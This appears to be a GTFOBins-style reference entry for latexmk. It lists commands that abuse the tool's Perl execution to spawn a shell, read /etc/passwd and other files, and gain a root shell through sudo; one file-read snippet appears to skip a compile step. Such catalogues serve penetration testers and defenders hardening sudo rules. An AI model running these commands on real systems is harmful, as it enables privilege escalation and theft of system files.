---
description: This allows to execute [`perl`](/gtfobins/perl/) code.
functions:
  shell:
    - code: |
        latexmk -e 'exec "/bin/sh";'
    - code: |
        latexmk -latex='/bin/sh #' /dev/null
  file-read:
    - code: |
        latexmk -e 'open(X,"/etc/passwd");while(<X>){print $_;}exit'
    - description: The read file will be part of the output.
      code: |
        TF=$(mktemp)
        echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' >$TF
        strings tmp.dvi
  sudo:
    - code: sudo latexmk -e 'exec "/bin/sh";'
---
